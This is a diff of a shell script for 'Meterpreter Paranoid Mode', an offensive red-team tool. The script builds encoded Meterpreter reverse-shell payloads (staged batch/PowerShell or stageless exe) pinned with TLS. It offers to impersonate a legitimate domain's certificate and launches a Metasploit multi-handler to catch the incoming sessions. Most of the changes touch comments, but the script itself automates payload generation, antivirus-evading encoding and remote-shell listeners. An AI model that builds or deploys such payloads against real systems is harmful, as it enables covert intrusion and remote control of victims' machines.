@@ -1,23 +1,22 @@
 #!/bin/sh
 ##
-# Meterpreter Paranoid Mode - Meterpreter over SSL/TLS traffic
+# Meterpreter Paranoid Mode - SSL/TLS connections
 # Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.2
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
+# Suspicious-Shell-Activity (SSA) RedTeam dev @2017
 # ---
 #
 # DESCRIPTION:
 # In some scenarios, it pays to be paranoid. This also applies to generating
-# and handling Meterpreter sessions. This document walks through the process
-# of implementing a paranoid Meterpreter payload (SSL/TLS) and listener to
-# Create a SSL/TLS Certificate to use in connection ..
+# and handling Meterpreter sessions. This script implements the Meterpreter
+# paranoid mode (SSL/TLS) payload build, by creating a SSL/TLS Certificate
+# (manual OR impersonate) to use in connection (server + client) ..
+# "The SHA1 hash its used to validate the connetion betuiwn handler/payload"
 # ---
 #
-# Special Thanks:
-# HD-moore (rapid7 article)
-# https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
-# OJ (staged-vs-stageless)
+# SPECIAL THANKS (POCs):
+# hdmoore | oj | darkoperator
 # http://buffered.io/posts/staged-vs-stageless-handlers/
-# darkoperator (Meterpreter SSL Certificate Validation)
+# https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
 # https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
 ##
 
@@ -30,9 +29,9 @@
 V3R="1.2"                                   # Tool version release
 IPATH=`pwd`                                 # Store tool full install path
 ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
-DEFAULT_EXT="bat"                           # Default payload extension to use (bat|ps1|txt)
-ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload
-ENCODE_NUMB="3"                             # How many interactions to encode payload
+DEFAULT_EXT="bat"                           # Default payload extension to use (bat | ps1 | txt)
+ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload (32bits | 64bits)
+ENCODE_NUMB="3"                             # How many interactions to encode payload (0 | 9)
 # __________________________________________|
 
 
@@ -65,6 +64,7 @@ cat << !
  We start by generating a certificate in PEM format, once the certs have
  been created we can create a HTTP or HTTPS or EXE payload for it and give
  it the path of PEM format certificate to be used to validate the connection.
+
  To have the connection validated we need to tell the payload what certificate
  the handler will be using by setting the path to the PEM certificate in the
  HANDLERSSLCERT option then we enable the checking of this certificate by
@@ -134,6 +134,7 @@ if [ "$ChEk_DB" = "ON" ]; then
   echo ${BlueF}[☆]${white}" Starting postgresql service .."${Reset};
   service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   echo ${BlueF}[☆]${white}" Checking msfdb connection status .."${Reset};
+  # Store db_status core command into one variable
   ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
     if [ "$ih" != "connected" ]; then
       echo ${RedF}[x]${white}" postgresql selected, no connection .."${Reset};
@@ -170,7 +171,8 @@ clear
 
 
 #
-# Tool main banner ..
+# Tool main menu banner ..
+# we can abort (ctrl+c) tool execution at this point ..
 #
 cat << !
 
@@ -197,12 +199,12 @@ read OP
 
 
 #
-# Chose payload categorie (staged/stageless) ..
+# Chose payload categorie to be used (staged/stageless) ..
 #
 cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 160) > /dev/null 2>&1
 if [ "$cHos" = "manual certificate" ]; then
   #
-  # SSA TEAM CERTIFICATE (manual build)
+  # SSA TEAM CERTIFICATE or your OWN (manual creation)
   #
   echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
   CoNtRy=$(zenity --title="☠ Enter  CONTRY CODE ☠" --text "example: US" --entry --width 270) > /dev/null 2>&1
@@ -218,8 +220,8 @@ if [ "$cHos" = "manual certificate" ]; then
 
 elif [ "$cHos" = "impersonate domain" ]; then
   #
-  # Impersonate a legit domain (msf build) ..
-  # Copy files to proper location and cleannup ..
+  # Impersonate a legit domain (msf auxiliary module)
+  # Copy files generated to proper location and cleanup ..
   #
   echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
   N4M3=$(zenity --title="☠ Enter  DOMAIN NAME ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
@@ -232,6 +234,7 @@ elif [ "$cHos" = "impersonate domain" ]; then
   echo "Writing new private key to '$N4M3.key'"
   lOoT=`locate .msf4/loot`
   cd $lOoT
+  # Cleanup, copy/paste in output folder ..
   mv *.pem $IPATH/output/$N4M3.pem > /dev/null 2>&1
   rm *.key && rm *.crt && rm *.log > /dev/null 2>&1
   echo ${BlueF}[☠]${white}" Stored: output/$N4M3.pem .."${BlueF};
@@ -253,18 +256,19 @@ fi
 
 
 #
-# Chose to build a staged (payload.bat) or a stageless (payload.exe) ..
+# Chose to build a staged (payload.bat|ps1|txt) or a stageless (payload.exe) ..
 #
 BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 160) > /dev/null 2>&1
 #
 # Staged payload build (batch output)
+# HINT: Edit script and change 'DEFAULT_EXT=bat' to the extension required ..
 #
 if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
   echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
   sleep 1
     #
     # Create a Paranoid Payload (staged payload)
-    # For this use case, we will combine Payload UUID tracking and whitelisting with TLS pinning.
+    # For this use case, we will combine Payload UUID tracking with TLS pinning.
     #
     echo ${BlueF}[☠]${white} Building staged payload ..${BlueF};
     LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
@@ -290,10 +294,10 @@ if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
       sleep 2
 
   # 
-  # Create the Paranoid Listener (multi-handler)
+  # Create the staged Paranoid Listener (multi-handler)
   #
-  # A staged payload would need to set the HandlerSSLCert and StagerVerifySSLCert options
-  # to enable TLS pinning and IgnoreUnknownPayloads to whitelist registered payload UUIDs:
+  # A staged payload would need to set the HandlerSSLCert and
+  # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; run -j'"
   echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
@@ -319,10 +323,10 @@ elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
 
 
   #
-  # Create a Paranoid Listener (multi-handler)..
+  # Create a stageless Paranoid Listener (multi-handler)..
   #     
-  # A stageless payload would need to set the HandlerSSLCert and StagerVerifySSLCert options
-  # to enable TLS pinning and IgnoreUnknownPayloads to whitelist registered payload UUIDs:
+  # A stageless payload would need to set the HandlerSSLCert and
+  # StagerVerifySSLCert true options to enable TLS pinning:
   echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
   xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; run -j'"
   echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
